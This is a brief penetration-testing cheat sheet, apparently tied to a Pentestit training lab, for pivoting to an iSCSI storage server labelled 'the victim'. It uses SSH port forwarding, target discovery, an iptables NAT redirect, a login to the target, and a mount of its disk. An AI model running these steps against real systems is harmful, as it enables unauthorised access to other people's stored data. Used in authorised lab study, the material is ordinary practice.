# ISCSI On the Network

## Dependency Setup
```
apt install open-iscsi
```

## Forward your port to the victim
```
ssh -L 3260:192.168.0.3:3260 d.nash@192.168.101.8

iscsiadm -m discovery -t sendtargets -p 127.0.0.1
iptables -t nat -A OUTPUT -d 192.168.0.3 -j DNAT --to-destination 127.0.0.1
cat /proc/partitions
iscsiadm -m node --targetname=iqn.2016-05.ru.pentestit:storage.lun0 -p 192.168.0.3 --login -d 8
mount -o ro /dev/sdb1 /mnt/
```

## Check which new partitions appeared
```
cat /proc/partitions
```

tags: #iscsi 
